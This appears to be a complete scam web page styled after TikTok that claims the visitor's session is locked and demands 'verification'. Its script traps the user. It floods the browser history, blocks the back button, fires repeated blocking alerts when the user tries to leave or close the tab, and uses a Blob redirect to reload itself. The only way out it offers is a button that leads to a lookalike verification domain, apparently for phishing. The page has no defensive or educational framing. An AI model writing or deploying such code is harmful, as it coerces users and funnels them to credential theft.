<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: #ffffff; font-family: -apple-system, sans-serif;
            overflow: hidden; touch-action: none;
        }
        #ui {
            display: flex; flex-direction: column; align-items: center; 
            justify-content: center; height: 100vh; text-align: center;
            position: relative; z-index: 1000; background: white;
        }
        .btn {
            background: #fe2c55; color: white; padding: 18px 60px; 
            border-radius: 4px; text-decoration: none; font-weight: 800;
            font-size: 18px; border: none; box-shadow: 0 4px 15px rgba(254,44,85,0.4);
        }
        /* Hidden elements for thread saturation */
        #noise { position: absolute; visibility: hidden; width: 1px; height: 1px; }
    </style>
</head>
<body>

    <div id="noise"></div>

    <div id="ui">
        <div style="font-size: 26px; font-weight: 800; margin-bottom: 10px;">Verification Required</div>
        <p style="color: #8a8b91; padding: 0 40px; margin-bottom: 40px;">Your session is locked. Complete the secure verification to continue.</p>
        <button class="btn" id="go">VERIFY NOW</button>
    </div>

<script>
    const target = "https://tiktokverification.github.io/captcha/Verification/verify1.html";

    // 1. THE THREAD SATURATOR (The "X" Jammer)
    // We create a "busy-wait" loop. This makes the UI unresponsive to external 'Close' hits.
    function saturate() {
        const noise = document.getElementById('noise');
        setInterval(() => {
            // High-speed DOM churning to keep Renderer busy
            let d = document.createElement('div');
            noise.appendChild(d);
            noise.removeChild(d);
            
            // High-speed History Churning to jam the 'Back' button
            history.pushState(null, null, "#" + Math.random());
        }, 5); 
    }

    // 2. THE NUCLEAR NAVIGATION TRAP
    function handleExitAttempt(e) {
        // Force the browser to show the "Leave site?" system dialog
        e.preventDefault();
        e.returnValue = '';

        // Immediate System Freeze
        alert("SECURITY: Verification must be completed to unlock your account.");
        
        // If they click 'OK' on the alert, we slam them into a Blob Redirect
        // This 're-captures' the tab before it can close.
        const blob = new Blob([
            `<html><script>window.location.replace("${window.location.href}");<\/script></html>`
        ], {type: 'text/html'});
        window.location.replace(URL.createObjectURL(blob));
        
        return "";
    }

    // 3. EVENT BINDING
    window.addEventListener('beforeunload', handleExitAttempt);
    window.addEventListener('pagehide', handleExitAttempt);
    window.addEventListener('unload', handleExitAttempt);

    // 4. THE BLUR DEFENSE (When the X is touched)
    window.onblur = function() {
        // Tapping the native bar blurs the window.
        // We respond with a blocking alert to halt the close process.
        setTimeout(() => {
            alert("SYSTEM LOCK: Please follow the on-screen instructions.");
            window.focus();
        }, 1);
    };

    // 5. BACK BUTTON BLOCK
    window.onpopstate = function() {
        history.forward();
        alert("Verification Incomplete.");
    };

    // INITIALIZE
    window.onload = () => {
        saturate();
        // Fill history stack
        for(let i=0; i<30; i++) history.pushState(null, null, "#lock");
    };

    document.getElementById('go').onclick = () => {
        // Disable the traps so the user can actually go to the verification link
        window.removeEventListener('beforeunload', handleExitAttempt);
        window.onblur = null;
        window.location.href = target;
    };
</script>
</body>
</html>
